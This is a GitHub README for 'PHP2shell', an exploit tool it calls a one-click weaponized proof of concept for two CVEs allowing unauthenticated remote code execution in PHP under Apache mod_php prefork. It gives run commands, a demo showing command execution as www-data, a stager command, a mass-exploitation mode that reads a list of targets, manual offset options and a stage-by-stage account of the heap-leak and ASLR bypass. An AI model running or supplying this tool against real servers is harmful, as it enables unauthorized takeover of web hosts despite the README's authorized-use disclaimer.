<div align="center">

<img src="https://upload.wikimedia.org/wikipedia/commons/2/27/PHP-logo.svg" alt="PHP logo" width="200">

<h1>💀 PHP2shell</h1>

<p><strong>One-click weaponized PoC for CVE-2026-109618 & CVE-2026-109619</strong></p>

<p>Targeting vulnerable PHP + Apache <code>mod_php</code> (<code>prefork</code>) deployments.</p>

<!-- Badges -->
<img alt="CVSS" src="https://img.shields.io/badge/CVSS_v4.0-9.2_Critical-red?style=for-the-badge&logo=shields.io">
<img alt="License" src="https://img.shields.io/badge/License-MIT-blue?style=for-the-badge">
<img alt="Python" src="https://img.shields.io/badge/Python-3.10%2B-3776AB?style=for-the-badge&logo=python&logoColor=white">
<img alt="Author" src="https://img.shields.io/badge/author-0xgh057r3c0n-black?style=for-the-badge&logo=github">

</div>

---

> ⚠️ **WARNING:** This tool is provided **strictly for authorized security testing, CTFs, and educational research**. Do not use this against infrastructure you do not own or have explicit permission to test. The author assumes no liability for misuse.

---

## ⚡ The Exploit

`PHP2shell` is a multi-stage memory corruption exploit targeting the PHP core within Apache `mod_php` `prefork` environments. 

By abusing Out-Of-Memory (OOM) handling and request-owned state that survives in persistent workers, this exploit bypasses ASLR (Address Space Layout Randomization), leaks internal heap and `libphp.so` pointers, and forges PHP structures to achieve **unauthenticated Remote Code Execution (RCE)**.

### 🎯 Supported Profiles
- **`bookworm` (Default):** Official `php:8.4.26-apache` Docker image on Debian Bookworm.
- **`lab`:** Custom lab build (PHP 8.4.26, Apache 2.4.68, Debian 12, gcc 12).

---

## 🚀 Quick Start

Get up and running in seconds. 

### 1. Clone & Prep
```bash
git clone https://github.com/0xgh057r3c0n/PHP2shell.git
cd PHP2shell
chmod +x php2shell.py
```

### 2. Fire in the Hole
```bash
python3 php2shell.py -u http://127.0.0.1:8088/index.php
```

---

## 📸 Terminal Demo

```text
$ python3 php2shell.py -u http://target.local/index.php

       .__           ________         .__           .__  .__   
______ |  |__ ______ \_____  \   _____|  |__   ____ |  | |  |  
\____ \|  |  \\____ \ /  ____/  /  ___/  |  \_/ __ \|  | |  |  
|  |_> >   Y  \  |_> >       \  \___ \|   Y  \  ___/|  |_|  |__
|   __/|___|  /   __/\_______ \/____  >___|  /\___  >____/____/
|__|        \/|__|           \/     \/     \/     \/           

                 php2shell — CVE-2026-109618 / CVE-2026-109619
                             CVSS v4.0: 9.2 Critical
                              author: 0xgh057r3c0n

[*] target http://target.local/index.php (cmd='id>/out/p1')
[*] offsets: zif=0x690d8 dtor=0x613c50 htdata=0x690d8
[*] rotating worker over HTTP
[*] stage 1: heap leak (attempt 1/3)
[+] chunk base = 0x7f8a40000000
[*] rotating worker over HTTP
[*] stage 2: libphp leak (attempt 1/3)
[+] libphp base = 0x7f8a12345000
[*] rotating worker over HTTP
[*] stage 3: HTDATA=0x7f8a40690d8 ZIF=0x7f8a123a9a870
[+] W3 attempt 1
PROOF: uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---

## 🛠️ Advanced Usage

<details>
<summary><b>Click to expand full options and techniques</b></summary>

### Custom Commands (14-Byte Limit)
Due to the 167-byte carrier size, the command length is strictly limited to **14 bytes**. To execute longer payloads, use a short stager:
```bash
python3 php2shell.py -u http://target.local/index.php -c 'sh</out/c'
```

### Target Files (Mass Exploitation)
Create a `targets.txt` file:
```text
http://10.0.0.1/index.php
https://10.0.0.2/index.php
target.local
```
Run the exploit sequentially against all targets:
```bash
python3 php2shell.py -t targets.txt
```

### Explicit Offsets
If you have extracted offsets manually or are targeting a custom build, pass them directly:
```bash
python3 php2shell.py -u http://target.local/index.php \
  --zif-offset 0x43A870 \
  --dtor-offset 0x613C50 \
  --htdata-offset 0x690D8
```

### Remote Verification
Instead of checking a local file, force the exploit to verify RCE by fetching a file via HTTP:
```bash
python3 php2shell.py -u http://target.local/index.php \
  -c 'id>/out/p1' \
  --proof-file '' \
  --fetch /out/p1
```

### All CLI Arguments
| Argument | Description |
|---|---|
| `-u, --url` | Target PHP page URL |
| `-t, --target-file` | File with one target URL per line |
| `-c, --cmd` | Command to execute (max 14 bytes) |
| `--proof-file` | Local proof file to check (default: `out/p1`) |
| `--fetch` | GET path to verify exploitation remotely |
| `--profile` | Target profile: `bookworm` (default) or `lab` |
| `--zif-offset` | Offset of `zif_system` in `libphp.so` |
| `--dtor-offset` | Offset of `ZVAL_PTR_DTOR` in `libphp.so` |
| `--htdata-offset` | Chunk-relative offset of the 167-byte string |
| `--retries` | Attempts per leak stage (default: 3) |
| `--no-color` | Disable ANSI colors |

</details>

---

## 🧠 Attack Chain Breakdown

<table>
<tr>
<td width="20%"><b>Stage 0</b></td>
<td><b>Worker Rotation:</b> Sends an oversized request to force Apache <code>prefork</code> to abort the current worker and fork a fresh child with a clean heap.</td>
</tr>
<tr>
<td><b>Stage 1</b></td>
<td><b>Heap Leak:</b> Triggers OOM corruption so a module-global pointer references freed memory. Sprayed form fields reclaim the slot with a forged <code>zend_string</code>, leaking heap pointers via <code>Set-Cookie</code>.</td>
</tr>
<tr>
<td><b>Stage 2</b></td>
<td><b>ASLR Bypass:</b> Leaks a <code>zval_ptr_dtor</code> pointer from <code>libphp.so</code>. Subtracting the known <code>DTOR_OFFSET</code> reveals the library base address.</td>
</tr>
<tr>
<td><b>Stage 3</b></td>
<td><b>RCE:</b> Forges a fake <code>HashTable</code> and sets <code>pDestructor</code> to <code>libphp_base + ZIF_OFFSET</code>. PHP's cleanup routine calls <code>zif_system</code> with your command.</td>
</tr>
</table>


<div align="center">
  <p>Licensed under the <b>MIT License</b>. See <a href="LICENSE">LICENSE</a> for details.</p>
  <p>Crafted with 🔥 by <a href="https://github.com/0xgh057r3c0n">0xgh057r3c0n</a></p>
</div>
